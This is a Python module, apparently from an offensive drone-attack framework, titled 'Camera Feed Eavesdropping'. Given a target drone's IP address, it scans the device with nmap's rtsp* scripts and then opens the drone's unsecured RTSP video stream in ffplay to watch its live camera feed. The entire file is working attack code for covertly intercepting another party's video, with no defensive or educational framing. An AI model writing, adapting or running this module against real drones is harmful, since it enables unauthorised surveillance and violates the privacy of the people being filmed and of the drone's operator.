# Filename: modules/camera_feed_eavesdropping.py

from core.base import BaseModule
import subprocess

class CameraFeedEavesdroppingModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Camera Feed Eavesdropping",
            description="Intercepts the real-time video feed from a drone's camera using insecure RTSP streams.",
            category="Extraction"
        )
        self.options = {
            "target_ip": {"value": "", "description": "Target IP address of the drone.", "required": True},
            "target_port": {"value": "554", "description": "Target RTSP port.", "required": True},
            "stream_path": {"value": "/stream1", "description": "RTSP stream path.", "required": True}
        }

    def execute(self):
        target_ip = self.get_option("target_ip")
        target_port = self.get_option("target_port")
        stream_path = self.get_option("stream_path")

        if not target_ip:
            print("[!] Target IP is required.")
            return

        print(f"[*] Scanning for RTSP streams on {target_ip}...")
        nmap_command = ["nmap", target_ip, "--script", "rtsp*"]
        subprocess.run(nmap_command)

        rtsp_url = f"rtsp://{target_ip}:{target_port}{stream_path}"
        print(f"[*] Attempting to intercept RTSP stream at {rtsp_url}...")

        ffplay_command = ["ffplay", rtsp_url]
        subprocess.run(ffplay_command)

